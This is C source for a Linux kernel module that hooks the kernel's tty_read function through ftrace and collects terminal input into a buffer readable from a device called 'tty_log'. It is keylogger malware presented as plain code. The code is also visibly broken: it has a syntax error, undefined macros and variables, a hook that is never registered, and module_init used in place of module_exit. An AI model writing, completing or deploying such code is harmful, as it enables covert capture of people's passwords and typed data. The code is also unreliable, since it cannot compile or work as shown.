#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/sysfs.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hyp");

#define DEVICE_NAME "tty_log"
#define SUCCESS 0

static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);

static int major;

static char tty_keybuf[10000] = {};
static char *msg_ptr;

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

static int ftrace_resolve(struct ftrace_hook *hook) {
	hook->address = kallsyms_lookup_name(hook->name);

	if(!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}
	*((unsigned long *) hook->original) = hook->address;

	return 0;
}

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct pt_regs *regs) {

	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

	if(!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
}

int install_hook(struct ftrace_hook *hook) {
	int err;

	err = ftrace_resolve(hook);
	if(err)
		return err;

	hook->ops.func = ftrace_thunk;
	hook->.flags = FTRACE_OPS_FL_SAVE_REGS
		| FTRACE_OPS_FL_RECURSION_SAFE
		| FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if(err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

void remove_hook(struct ftrace_hook *hook) {
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if(err)
		pr_debug("unregister_ftrace_function failed: %d\n", err);

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if(err)
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
}

int install_hooks(struct ftrace_hook *hooks, size_t count) {
	int err;
	size_t i;

	for(i=0;i<count;i++) {
		err = install_hook(&hooks[i]);
		if(err)
			goto error;
	}

	return 0;

error:
	while(i != 0) {
		remove_hook(&hooks[--i]);
	}

	return err;
}

void remove_hooks(struct ftrace_hook *hooks, size_t count) {
	size_t i;

	for(i=0;i<count;i++)
		remove_hook(&hooks[i]);
}

static asmlinkage ssize_t (*real_tty_read)(struct file *file, char __user *buf,
		size_t count, loff_t *pos);

static asmlinkage ssize_t ftrace_tty_read(struct file *file, char __user *buf,
		size_t count, loff_t *ppos) {

	ssize_t ret;

	if(strlen(buf) > 0) {
		strncat(tty_keybuf, buf, strlen(buf));
	}

	ret = real_tty_read(file, buf, count, ppos);

	return ret;
}

static void kill_ftrace(unsigned long data) {
	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
	return;
}

static struct ftrace_hook tty_hooks[] = {
	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
};

static int device_open(struct inode *inode, struct file *file) {
	if(is_open)
		return -EBUSY;

	msg_ptr = tty_keybuf;
	is_open++;
	try_module_get(THIS_MODULE);

	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file) {
	is_open--;
	module_put(THIS_MODULE);

	return 0;
}

static ssize_t device_write(struct file *filp, const char __user *buff,
		size_t len, loff_t *off) {

	return -EINVAL;
}

static int __init init_ttylog(void) {
	tty_keybuf[0] = '\0';
	sema_init(&sem, 1);

	major = register_chrdev(0, DEVICE_NAME, &fops);
	pr_info("ttylog major: %d\n", major);

	return 0;
}

static void __exit cleanup_ttylog(void) {
	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
	pr_info("Unregistered ttylog\n");
}

module_init(init_ttylog);
module_init(cleanup_ttylog);
